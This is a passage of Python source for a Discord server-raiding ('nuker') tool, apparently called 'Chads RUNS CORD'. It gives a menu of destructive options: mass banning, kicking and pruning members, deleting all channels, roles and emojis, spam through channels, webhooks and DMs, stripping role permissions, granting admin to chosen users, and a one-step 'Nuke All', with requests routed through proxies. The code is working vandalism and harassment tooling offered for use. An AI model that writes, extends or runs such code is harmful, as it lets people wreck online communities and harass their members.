                                headers={"Authorization": f"Bot {token}"},
                                json={"nick": None},
                                proxy=self._get_proxy(),
                            ) as retry:
                                if retry.status in (200, 204):
                                    success_count += 1
                                    print(f"{format_log_message('SUCCESS', f'Unnicked → {member_id}', 52)}")
                except:
                    pass

        start_time = time.time()
        await asyncio.gather(*(unick_one(mid) for mid in members), return_exceptions=True)
        duration = time.time() - start_time

        print(format_log_message("SUCCESS", f"Finished: {success_count}/{total} members un-nicked in {duration:.2f}s", 55))
        time.sleep

        return success_count

    async def execute_guild_info(self, token: str):
        guild_id = await self.async_input(format_log_message("INFO", "Enter the guild ID to fetch info for", 50))
        if not guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid guild ID.", 40))
            return

        session = await self._get_session()
        try:
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                if resp.status != 200:
                    print(format_log_message("ERROR", f"Failed to fetch guild {guild_id}", 40))
                    return
                guild = await resp.json()

            owner_id = guild.get('owner_id')
            owner_name = "N/A"
            if owner_id:
                async with session.get(f"https://discord.com/api/v10/users/{owner_id}", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as user_resp:
                    if user_resp.status == 200:
                        owner_data = await user_resp.json()
                        owner_name = f"{owner_data.get('username')}#{owner_data.get('discriminator')}"

            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                channels = await resp.json() if resp.status == 200 else []
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                roles = await resp.json() if resp.status == 200 else []
            async with session.get(f"https://discord.com/api/v10/guilds/{guild_id}/emojis", headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                emojis = await resp.json() if resp.status == 200 else []

            vanity_code = guild.get('vanity_url_code') or "None"
            creation_date = discord.utils.snowflake_time(int(guild['id'])).strftime("%Y-%m-%d %H:%M:%S")

            info = [
                ("Guild Name", guild.get('name')),
                ("Guild ID", guild.get('id')),
                ("Owner", f"{owner_name} ({owner_id})"),
                ("Created At", creation_date),
                ("Members", guild.get('approximate_member_count', 'N/A')),
                ("Vanity URL", vanity_code),
                ("Total Channels", len(channels)),
                ("Total Roles", len(roles)),
                ("Total Emojis", len(emojis)),
            ]

            mode_start, mode_end = get_mode_colors()
            print(gradient_text("╭" + "─" * 60 + "╮", mode_start, mode_end, bold=True))
            for key, value in info:
                print(gradient_text(f"│ {key:<20} │ {str(value):<35} │", mode_start, mode_end, bold=True))
            print(gradient_text("╰" + "─" * 60 + "╯", mode_start, mode_end, bold=True))

        except Exception as e:
            print(format_log_message("ERROR", f"An error occurred: {e}", 40))
    
    async def execute_nuke_all(self, token: str):
        print(format_log_message("INFO", "Starting FULL NUKE - Chads / DESTROYER RUNS CORD...", 40))
        
        nuke_config = __config__.get("nuke_all", {})
        
        session = await self._get_session()
        
        channels_resp = await session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
            headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
        )
        channels = await channels_resp.json() if channels_resp.status == 200 else []
        
        tasks = []
        
        if nuke_config.get("ban_members", True):
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip() and line.strip().isdigit()]
                print(format_log_message("INFO", f"Preparing to ban {len(members)} members...", 45))
                for member in members:
                    if member not in self.whitelist:
                        tasks.append(self.execute_ban(member, token))
            except FileNotFoundError:
                print(format_log_message("INFO", "members.txt not found → skipping mass ban", 45))
            except Exception as e:
                print(format_log_message("ERROR", f"Error preparing ban list: {e}", 45))
        
        if nuke_config.get("delete_channels", True):
            print(format_log_message("INFO", f"Deleting {len(channels)} channels...", 45))
            for ch in channels:
                tasks.append(self.execute_delchannels(ch['id'], token))
        
        if nuke_config.get("create_roles", True):
            print(format_log_message("INFO", "Mass creating 60 new roles...", 45))
            role_tasks = []
            for _ in range(60):
                role_name = random.choice(__config__["nuke"]["roles_name"])
                role_tasks.append(self.execute_creroles(role_name, token))
            await asyncio.gather(*role_tasks, return_exceptions=True)
        
        if nuke_config.get("change_guild_name", True):
            guild_name = __config__.get("operations", {}).get("guild_name", "Wizzed By Chads")
            tasks.append(self.execute_change_guild_info(token, new_name=guild_name, new_desc=""))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        if nuke_config.get("create_channels", True):
            print(format_log_message("INFO", "Mass creating 75 new text channels...", 45))
            channel_tasks = []
            for _ in range(75):
                ch_name = random.choice(__config__["nuke"]["channel_names"])
                channel_tasks.append(self.execute_crechannels(ch_name, 0, token))
            await asyncio.gather(*channel_tasks, return_exceptions=True)
        
        if nuke_config.get("spam_webhooks", True) or nuke_config.get("create_channels", True):
            print(format_log_message("INFO", "Starting final spam phase (webhooks + channel messages)...", 45))
            await self.execute_webhook_spam(token)
            await self.execute_spam_all_channels(token)
        
        print(format_log_message("SUCCESS", "FULL NUKE FINISHED — roles & emojis preserved + mass created!", 45))
        return True
    
    async def execute_delchannels_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                channels = await resp.json() if resp.status == 200 else []
        for ch in channels:
            await self.execute_delchannels(ch['id'], token)

    
    async def execute_delroles_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                roles = await resp.json() if resp.status == 200 else []
        
        roles_to_delete = [role['id'] for role in roles if role['id'] != self.guildid]
        print(format_log_message("INFO", f"Deleting {len(roles_to_delete)} roles (max speed)...", 45))
        
        tasks = [self.execute_delroles(role_id, token) for role_id in roles_to_delete]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_deleted = sum(1 for r in results if r is True)
        print(format_log_message("SUCCESS", f"Deleted {total_deleted}/{len(roles_to_delete)} roles", 45))

    
    async def execute_delemojis_all(self, token: str):
        session = await self._get_session()
        async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                             headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                emojis = await resp.json() if resp.status == 200 else []
        for emoji in emojis:
            await self.execute_delemojis(emoji['id'], token)
        await self.menu()
    
    async def execute_get_invite(self, token: str):
        try:
            platform = await self.async_input(format_log_message("INFO", "Platform: [w]indows/[m]obile", 32))
            if platform == "MODE_SWITCHED": return
            platform = platform.strip().lower()

            session = await self._get_session()
            async with session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                headers={"Authorization": f"Bot {token}"},
                proxy=self._get_proxy()
            ) as resp:
                if resp.status == 200:
                    channels = await resp.json()
                    if not channels:
                        print(format_log_message("ERROR", "No channels found to create an invite!", 45))
                        await self.menu()
                        return
                    
                    ch_id = channels[0]['id']
                    async with session.post(
                        f"https://discord.com/api/v10/channels/{ch_id}/invites",
                        headers={"Authorization": f"Bot {token}"},
                        json={"max_age": 0, "max_uses": 0},
                        proxy=self._get_proxy()
                    ) as inv_resp:
                        if inv_resp.status == 200:
                            invite_data = await inv_resp.json()
                            invite_link = f"https://discord.gg/{invite_data.get('code')}"
                            
                            if platform == 'm':
                                print(format_log_message("SUCCESS", f"Invite Link: {invite_link}", 45))
                                print(format_log_message("INFO", "Displaying for 7 seconds...", 45))
                                await asyncio.sleep(7)
                            else:
                                pyperclip.copy(invite_link)
                                print(format_log_message("SUCCESS", "Invite Link copied to clipboard!", 45))
                        else:
                            print(format_log_message("ERROR", "Failed to create invite.", 45))
                else:
                    print(format_log_message("ERROR", f"Failed to fetch channels (Status: {resp.status})", 45))
            
            await self.menu()
        except Exception as e:
            print(format_log_message("ERROR", f"Error in get_invite: {e}", 45))
            await self.menu()
            
    async def menu(self): 
        pause_seconds = 2.5
        os.system("cls") if os.name == "nt" else os.system("clear")
        
        if os.name == "nt":
            os.system(f'title VIVEK RUNS CORD')
        
        if __mode__ == "destroyer":
            destroyer_banner = """
██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗███████╗██████╗ 
██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ █████╗  ██████╔╝
██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══╝  ██╔══██╗
██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                           
""".rstrip('\n').split('\n')
            new_banner = '\n'.join(gradient_text(line.center(console_width), DESTROYER_START, DESTROYER_END, bold=True) for line in destroyer_banner)
            mode_start, mode_end = DESTROYER_START, DESTROYER_END
        else:
            chads_banner = """
 ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝
██║     ███████║███████║██║  ██║███████╗
██║     ██╔══██║██╔══██║██║  ██║╚════██║
╚██████╗██║  ██║██║  ██║██████╔╝███████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝
                                        
""".rstrip('\n').split('\n')
            new_banner = '\n'.join(gradient_text(line.center(console_width), KRISHNA_START, KRISHNA_END, bold=True) for line in chads_banner)
            mode_start, mode_end = VIVEK_START, VIVEK_END

        options = """
<Made By Chads & Vivek>
╭───────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│                                           Chads RUNS CORD                                              │
├───────────────────────────────────┬───────────────────────────────────┬───────────────────────────────────┤
│ <01> Ban Members                  │ <12> Nick All                     │ <23> DM All Members               │
│ <02> Kick Members                 │ <13> Change guild Icon            │ <24> Unban All Members            │
│ <03> Prune Members                │ <14> Change Guild Name/description│ <25> Strip All Role Perms         │
│ <04> Create Channels              │ <15> Give Admin                   │ <26> Auto Admin (Select Users)    │
│ <05> Create Roles                 │ <16> Delete Invites               │ <27> Lock All Channels            │
│ <06> Delete Channels              │ <17> Switch Guild                 │ <28> Unlock All Channels          │
│ <07> Delete Roles                 │ <18> Timeout All                  │ <29> Rename Emojis                │
│ <08> Delete Emojis                │ <19> Rename All Channels          │ <30> Unick All Users              │
│ <09> Spam Channels                │ <20> Rename All Roles             │ <31> Nuke All                     │
│ <10> Check Updates                │ <21> Webhook Spam                 │ <32> Get Invite Link (auto-copy)  │
│ <11> Credits                      │ <22> Untimeout All                │ <33> Mode: Fucker/Destroyer       │
├───────────────────────────────────┴───────────────────────────────────┴───────────────────────────────────┤
│ <34> Whitelist Add Member         │ <35> Whitelist Remove Member      │ <36> View Whitelist               │
│ <37> Switch Config                │ <38> List Loaded Configs          │ <39> Exit                         │
╰───────────────────────────────────────────────────────────────────────────────────────────────────────────╯
                                          <40> Guild Info                                          
                                <41> Get Bot Invite Link                                 
"""
        options = '\n'.join(gradient_text(line.center(console_width), mode_start, mode_end, bold=True) for line in options.split('\n'))
        
        print(new_banner)
        print(gradient_text("   Chads On Top".center(console_width), mode_start, mode_end, bold=True))
        print(gradient_text(f"     LOADED PROXIES: <{self.proxy_count}>".center(console_width), mode_start, mode_end, bold=True))
        print(gradient_text(f"     ACTIVE CONFIG: [{__current_config_name__}] | Total Configs: {len(__loaded_configs__)}".center(console_width), mode_start, mode_end, bold=True))
        auto_admin_status = "ON" if self.auto_admin_enabled else "OFF"
        print(gradient_text(f"     AUTO-ADMIN ON JOIN: [{auto_admin_status}] | Whitelisted: {len(self.whitelist)}".center(console_width), mode_start, mode_end, bold=True))
        print(gradient_text("    Join discord.gg/chillcafe".center(console_width), mode_start, mode_end, bold=True))
        print(options)
        ans = await self.async_input(format_log_message("INFO", "Select Option (press d+enter to switch modes)", 50))
        
        if ans == "MODE_SWITCHED":
            await self.menu()
            return
            
        ans = ans.strip()

        if ans in ["1", "01"]:
            scrape = await self.async_input(format_log_message("INFO", "Fetch member IDs? [Y/N]", 50))
            scrape = scrape.strip().lower()
            if scrape == "y":
                try:
                    os.makedirs("fetched", exist_ok=True)
                    guild = __client__.get_guild(int(self.guildid))
                    if guild:
                        with open("fetched/members.txt", "w") as f:
                            for member in guild.members:
                                f.write(f"{member.id}\n")
                        print(format_log_message("SUCCESS", f"Fetched {len(guild.members)} members", 38))
                    else:
                        print(format_log_message("ERROR", "Guild not found!", 47))
                        await self.menu()
                        return
                except Exception as e:
                    print(format_log_message("ERROR", f"Error fetching members | {e}", 41))
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.banned.clear()
            start_time = time.time()
            tasks = [self.execute_ban(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Banned {len(self.banned)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans in ["2", "02"]:
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
                if not members:
                    print(format_log_message("ERROR", "No members found. Fetch first.", 33))
                    await self.menu()
                    return
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error reading members | {e}", 41))
                await self.menu()
                return

            self.kicked.clear()
            start_time = time.time()
            tasks = [self.execute_kick(member, token) for member in members]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Kicked {len(self.kicked)}/{len(members)} members in ({duration:.2f}s)", 36))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans in ["3", "03"]:
            try:
                days_input = await self.async_input(format_log_message("INFO", "Prune days (0-7)", 50))
                days = int(days_input.strip())
                if 0 <= days <= 7:
                    start_time = time.time()
                    pruned_count = await self.execute_prune(days, token)
                    end_time = time.time()
                    duration = end_time - start_time
                    if pruned_count > 0:
                        print(format_log_message("SUCCESS", f"Pruned {pruned_count} members in ({duration:.2f}s)", 43))
                else:
                    print(format_log_message("ERROR", f"Days must be 0-7: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!", 46))
            except ValueError:
                print(format_log_message("ERROR", f"Invalid number: {gradient_text(days_input, PINK_START, PINK_END, bold=True)}!", 48))
            await self.menu()

        elif ans in ["4", "04"]:
            type_input = await self.async_input(format_log_message("INFO", "Channel type ['t'ext/'v'oice]", 50))
            type_ = 2 if type_input.strip().lower() == 'v' else 0
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            tasks = [self.execute_crechannels(random.choice(__config__["nuke"]["channel_names"]), type_, token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.channels)}/{amount} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans in ["5", "05"]:
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            self.roles.clear()
            start_time = time.time()
            tasks = [self.execute_creroles(random.choice(__config__["nuke"]["roles_name"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Created {len(self.roles)}/{amount} roles in ({duration:.2f}s)", 40))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans in ["6", "06"]:
            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                await self.menu()
                return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.channels.clear()
            start_time = time.time()
            tasks = [self.execute_delchannels(ch['id'], token) for ch in channels]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Deleted {len(self.channels)}/{len(channels)} channels in ({duration:.2f}s)", 36))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans in ["7", "07"]: 
            try:
                print(format_log_message("INFO", "Starting fast deletion of all roles...", 48))
                start_time = time.time()
                deleted_count = await self.execute_delroles_all(token)
                end_time = time.time()
                duration = end_time - start_time
                
                if deleted_count > 0:
                    print(format_log_message("SUCCESS", f"Successfully deleted {deleted_count} roles in {duration:.2f}s", 45))
                else:
                    print(format_log_message("INFO", f"Role deletion finished in {duration:.2f}s — no roles were deleted", 45))
                
                await asyncio.sleep(2.5)
                await self.menu()
            except Exception as e:
                print(format_log_message("ERROR", f"Mass role deletion failed: {str(e)}", 42))
                await asyncio.sleep(2.5)
                await self.menu()


        elif ans in ["8", "08"]:  
            try:
                print(format_log_message("INFO", "Starting fast deletion of all emojis...", 48))
                start_time = time.time()
                deleted_count = await self.execute_delemojis_all(token)
                end_time = time.time()
                duration = end_time - start_time
                
                if deleted_count > 0:
                    print(format_log_message("SUCCESS", f"Successfully deleted {deleted_count} emojis in {duration:.2f}s", 45))
                else:
                    print(format_log_message("INFO", f"Emoji deletion finished in {duration:.2f}s — no emojis were deleted", 45))
                
                await asyncio.sleep(2.5)
                await self.menu()
            except Exception as e:
                print(format_log_message("ERROR", f"Mass emoji deletion failed: {str(e)}", 42))
                await asyncio.sleep(2.5)
                await self.menu()

        elif ans in ["9", "09"]:
            try:
                amount_input = await self.async_input(format_log_message("INFO", "Spam amount", 50))
                amount = int(amount_input.strip())
                if amount <= 0:
                    raise ValueError
            except ValueError:
                print(format_log_message("ERROR", f"Invalid amount: {gradient_text(amount_input, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return

            try:
                session = await self._get_session()
                async with session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                    headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                channels = await response.json()
                            else:
                                print(format_log_message("ERROR", "Failed to fetch channels", 39))
                                await self.menu()
                                return
            except Exception as e:
                print(format_log_message("ERROR", f"Error fetching channels | {e}", 39))
                await self.menu()
                return

            if not channels:
                print(format_log_message("ERROR", "No channels found!", 44))
                await self.menu()
                return

            self.messages.clear()
            self.channels = [ch['id'] for ch in channels if ch['type'] == 0]
            if not self.channels:
                print(format_log_message("ERROR", "No text channels found for spam!", 32))
                await self.menu()
                return

            channel_cycle = cycle(self.channels)
            start_time = time.time()
            tasks = [self.execute_massping(next(channel_cycle), random.choice(__config__["nuke"]["messages_content"]), token) for _ in range(amount)]
            await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            print(format_log_message("SUCCESS", f"Spammed {len(self.messages)}/{amount} messages in ({duration:.2f}s)", 36))
            await asyncio.sleep(pause_seconds)
            await self.menu()
        elif ans == "10":
            print(format_log_message("INFO", "CHECKING UPDATES", 40))
            await asyncio.sleep(pause_seconds)
            webbrowser.open("https://krishnxa.netlify.app")
    
            await self.menu()
        elif ans == "11":
            credits = f"""
{format_log_message("INFO", "Credits:", 48)}
- MADE BY Chads & Vivek (givesalcohol).
- Join Discord server 
 • https://discord.gg/hawty
 • https://discord.gg/hawty
- Press Enter to return.
            """
            print(credits)
            await self.async_input("")
            await self.menu()

        elif ans == "12":
            nn = await self.async_input(format_log_message("INFO", "New nickname for all members", 50))
            nn = nn.strip()
            if nn:
                await self.execute_nick_all_fast(token, nn)
            else:
                print(format_log_message("ERROR", "Nickname cannot be empty", 45))
            await asyncio.sleep(1.8)
            await self.menu()

        elif ans == "13":
            start_time = time.time()
            success = await self.execute_change_icon(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change icon completed in ({duration:.2f}s)", 38))
            else:
                print(format_log_message("INFO", f"Change icon process finished in ({duration:.2f}s)", 36))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans == "14":
            start_time = time.time()
            success = await self.execute_change_guild_info(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Change guild info completed in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Change guild info process finished in ({duration:.2f}s)", 33))
            await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans == "15":
            success_count, duration = await self.execute_give_admin(token)
            if duration > 0:
                print(format_log_message("SUCCESS", f"Assigned admin to {success_count} users in ({duration:.2f}s)", 36))
            else:
                print(format_log_message("INFO", f"Assign admin process finished in ({duration:.2f}s)", 34))
            await self.menu()

        elif ans == "16":
            deleted_count, duration, total_invites = await self.execute_delete_invites(token)
            if duration > 0 or total_invites > 0:
                print(format_log_message("SUCCESS", f"Deleted {deleted_count}/{total_invites} invites in ({duration:.2f}s)", 44))
            else:
                print(format_log_message("INFO", f"Delete invites process finished in ({duration:.2f}s)", 42))
                await asyncio.sleep(pause_seconds)
            await self.menu()

        elif ans == "17":
            print(format_log_message("INFO", "Switching guild...", 45))
            guildid = await self.async_input(format_log_message("INFO", "Enter new Guild ID", 50))
            guildid = guildid.strip()
            os.system("cls") if os.name == "nt" else os.system("clear")
            await Chads(guildid, self.client).menu()
            os._exit(0)

        elif ans == "18":
            print(format_log_message("INFO", "Select Timeout Duration:", 50))
            print(gradient_text("╭" + "─" * 60 + "╮", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [1] 1 Day                                                  │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [2] 1 Week                                                 │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [3] 28 Days (Max)                                          │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 60 + "╯", PINK_START, PINK_END, bold=True))
            
            duration_choice = await self.async_input(format_log_message("INFO", "Choose duration (1-3)", 50))
            duration_map = {
                "1": 86400,    
                "2": 604800,   
                "3": 2419200   
            }
            
            duration_seconds = duration_map.get(duration_choice.strip())
            
            if not duration_seconds:
                print(format_log_message("ERROR", f"Invalid choice: {gradient_text(duration_choice, PINK_START, PINK_END, bold=True)}!", 47))
                await self.menu()
                return
            
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                print(format_log_message("ERROR", "members.txt not found. Fetch first.", 29))
                await self.menu()
                return

            start_time = time.time()
            tasks = [self.execute_timeout_all(member, duration_seconds, token) for member in members]
            results = await asyncio.gather(*tasks)
            end_time = time.time()
            duration = end_time - start_time
            success_count = sum(1 for r in results if r is True)
            await asyncio.sleep(pause_seconds)
            print(format_log_message("SUCCESS", f"Attempted to timeout {len(members)} members, succeeded {success_count} in ({duration:.2f}s)", 35))
            await self.menu()

        elif ans == "19":
            count = await self.execute_rename_channels(token)
            print(format_log_message("SUCCESS", f"Renamed {count} channels", 40))
            await self.menu()
            
        elif ans == "20":
            count = await self.execute_rename_roles(token)
            print(format_log_message("SUCCESS", f"Renamed {count} roles", 40))
            await self.menu()
            
        elif ans == "21":
            count = await self.execute_webhook_spam(token)
            print(format_log_message("SUCCESS", f"Sent {count} webhook messages", 40))
            await self.menu()
            await asyncio.sleep(pause_seconds)
            
        elif ans == "22":
            start_time = time.time()
            count = await self.execute_untimeout_all(token)
            end_time = time.time()
            duration = end_time - start_time
            await asyncio.sleep(pause_seconds)
            print(format_log_message("SUCCESS", f"Removed timeout from {count} members in ({duration:.2f}s)", 40))
            await self.menu()
            await asyncio.sleep(pause_seconds)
        elif ans == "23":
            count = await self.execute_dm_all(token)
            print(format_log_message("SUCCESS", f"DM'd {count} members", 40))
            await self.menu()
            await asyncio.sleep(pause_seconds)
        elif ans == "24":
            count = await self.execute_unban_all(token)
            await self.menu()
        elif ans == "25":
            count = await self.execute_strip_perms(token)
            print(format_log_message("SUCCESS", f"Stripped perms from {count} roles", 40))       
            await self.menu()
            await asyncio.sleep(pause_seconds)
            return
          
        elif ans == "26":
            print(gradient_text("╭" + "─" * 70 + "╮", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ Auto Admin Options:                                                  │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [1] Grant admin to users immediately                                 │", PINK_START, PINK_END, bold=True))
            print(gradient_text("│ [2] Toggle auto-admin on join for whitelisted users                  │", PINK_START, PINK_END, bold=True))
            print(gradient_text(f"│ Current auto-admin status: {'ENABLED' if self.auto_admin_enabled else 'DISABLED':<38}    │", PINK_START, PINK_END, bold=True))
            print(gradient_text("╰" + "─" * 70 + "╯", PINK_START, PINK_END, bold=True))
            
            choice = await self.async_input(format_log_message("INFO", "Select option [1/2]", 50))
            choice = choice.strip().lower()

            if choice == "1":
                user_ids_input = await self.async_input(format_log_message("INFO", "User IDs for admin (comma-separated)", 50))
                user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip() and uid.strip().isdigit()]

                if not user_ids:
                    print(format_log_message("ERROR", "No valid user IDs provided", 40))
                    await asyncio.sleep(1.5)
                    await self.menu()
                    return

                guild = self.client.get_guild(int(self.guildid))
                if not guild:
                    print(format_log_message("ERROR", f"Guild {self.guildid} not accessible", 45))
                    await asyncio.sleep(1.5)
                    await self.menu()
                    return

                invalid_users = []
                for uid in user_ids:
                    if guild.get_member(int(uid)) is None:
                        invalid_users.append(uid)

                if invalid_users:
                    print(format_log_message("ERROR", f"Users not in guild: {', '.join(invalid_users)}", 55))
                    print(format_log_message("INFO", "Clearing and reloading menu.", 40))
                    os.system("cls" if os.name == "nt" else "clear")
                    await self.menu()
                    return

                success_count = 0
                for user_id in user_ids:
                    if await self.execute_auto_admin(token, user_id):
                        success_count += 1

                print(format_log_message("SUCCESS", f"Admin granted to {success_count}/{len(user_ids)} users", 40))

            elif choice == "2":
                self.auto_admin_enabled = not self.auto_admin_enabled
                status = "ENABLED" if self.auto_admin_enabled else "DISABLED"
                print(format_log_message("SUCCESS", f"Auto-admin on join now {status}", 40))

            else:
                print(format_log_message("ERROR", f"Invalid choice: {choice}", 47))

            await asyncio.sleep(1.2)
            await self.menu()

        elif ans == "27":
            start_time = time.time()
            success = await self.execute_lock_all_channels(token)
            end_time = time.time()
            duration = end_time - start_time
            if success:
                print(format_log_message("SUCCESS", f"Locked all channels in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Lock channels process finished in ({duration:.2f}s)", 33))
            await self.menu()
            await asyncio.sleep(pause_seconds)
            
        elif ans == "28":
            start_time = time.time()
            success = await self.execute_unlock_all_channels(token)
            end_time = time.time()
            duration = end_time - start_time
            await asyncio.sleep(pause_seconds)
            if success:
                print(format_log_message("SUCCESS", f"Unlocked all channels in ({duration:.2f}s)", 35))
            else:
                print(format_log_message("INFO", f"Unlock channels process finished in ({duration:.2f}s)", 33))
            await self.menu()
            await asyncio.sleep(pause_seconds)
        elif ans == "29":
            count = await self.execute_rename_emojis(token)
            print(format_log_message("SUCCESS", f"Renamed {count} emojis", 40))
            await asyncio.sleep(pause_seconds)
        elif ans == "30":
            await self.execute_unick_all_fast(token)
            await asyncio.sleep(1.8)
            await self.menu()
        elif ans == "31":
            await self.execute_nuke_all(token)
            print(format_log_message("SUCCESS", "FULL NUKE COMPLETE", 40))
            await asyncio.sleep(pause_seconds)
        elif ans == "32":
            await self.execute_get_invite(token)
            time.sleep(1.5)
        elif ans == "33":
          if __mode__ == "Chads":
              switch_to_destroyer()  
          else:
              switch_to_chads()
          await asyncio.sleep(pause_seconds)    
          await self.menu()  
                  
        elif ans == "34":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to whitelist (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                print(format_log_message("SUCCESS", f"Adding {len(user_ids)} user(s) to whitelist...", 45))
                for user_id in user_ids:
                    result = await self.add_to_whitelist(user_id)
                    if result:
                        print(format_log_message("SUCCESS", f"Added user #{user_id} to whitelist", 48))
            else:
                print(format_log_message("ERROR", "No valid user IDs provided", 50))
            await self.menu()
        
        elif ans == "35":
            user_ids_input = await self.async_input(format_log_message("INFO", "User IDs to unwhitelist (comma-separated)", 50))
            user_ids = [uid.strip() for uid in user_ids_input.split(',') if uid.strip()]
            if user_ids:
                print(format_log_message("SUCCESS", f"Removing {len(user_ids)} user(s) from whitelist...", 45))
                for user_id in user_ids:
                    result = await self.remove_from_whitelist(user_id)
                    if result:
                        print(format_log_message("SUCCESS", f"Removed user #{user_id} from whitelist", 48))
            else:
